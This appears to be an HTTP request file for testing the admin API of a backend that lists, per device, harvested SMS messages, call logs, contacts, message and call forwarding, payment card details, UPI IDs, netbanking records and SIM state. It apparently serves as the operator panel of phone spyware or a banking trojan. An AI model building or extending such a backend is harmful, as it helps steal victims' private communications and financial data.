@base = http://localhost:8085
@asid = 3c648352-05fc-43d2-97be-c1dc93d0c009
@deviceId = device-001
@from = 2024-10-01T00:00:00Z
@to = 2026-01-01T00:00:00Z

### Admin: validate session (to see adminId and appId)
GET http://localhost:8082/auth/session/validate
Cookie: asid={{asid}}


### Telemetry: list records (all devices for logged-in admin)
GET {{base}}/telemetry/records?from={{from}}&to={{to}}&page=0&size=50
Cookie: asid={{asid}}

### Telemetry: single device
GET {{base}}/telemetry/records?deviceId={{deviceId}}&page=0&size=50
Cookie: asid={{asid}}

### Telemetry: list full (omit page/size to fetch all)
GET {{base}}/telemetry/records?from={{from}}&to={{to}}
Cookie: asid={{asid}}

### Messages: list (filters optional: deviceId, recipient, status, type, from, to)
GET {{base}}/messages?deviceId={{deviceId}}&recipient=&status=&type=&from={{from}}&to={{to}}&page=0&size=50
Cookie: asid={{asid}}

### Call Logs: list (filters optional: deviceId, number, type, from, to)
GET {{base}}/calllogs?deviceId={{deviceId}}&number=&type=&from={{from}}&to={{to}}&page=0&size=50
Cookie: asid={{asid}}

### Contacts: list (filters optional: deviceId, q)
GET {{base}}/contacts?deviceId={{deviceId}}&q=&page=0&size=50
Cookie: asid={{asid}}

### Message Forwarding: list (filters optional: deviceId, recipient, forwardTo, status, from, to)
GET {{base}}/messageforwarding?deviceId={{deviceId}}&recipient=&forwardTo=&status=&from=&to=&page=0&size=50
Cookie: asid={{asid}}

### Call Forwarding: list (filters optional: deviceId, subscriptionId, reason, service)
GET {{base}}/callforwarding?deviceId={{deviceId}}&subscriptionId=&reason=&service=&page=0&size=50
Cookie: asid={{asid}}

### Cards: list (filters optional: deviceId, q (bin/last4), network)
GET {{base}}/cards?deviceId={{deviceId}}&q=&network=&page=0&size=50
Cookie: asid={{asid}}

### VPA: list (filters optional: deviceId, q (upiId/phone))
GET {{base}}/vpa?deviceId={{deviceId}}&q=&page=0&size=50&from={{from}}&to={{to}}
Cookie: asid={{asid}}

### Netbanking
GET {{base}}/netbanking?deviceId={{deviceId}}&q=&page=0&size=50&from={{from}}&to={{to}}
Cookie: asid={{asid}}

### Device Apps snapshot
GET {{base}}/state/apps?deviceId={{deviceId}}
Cookie: asid={{asid}}

### Device SIM snapshot
GET {{base}}/state/sim?deviceId={{deviceId}}
Cookie: asid={{asid}}

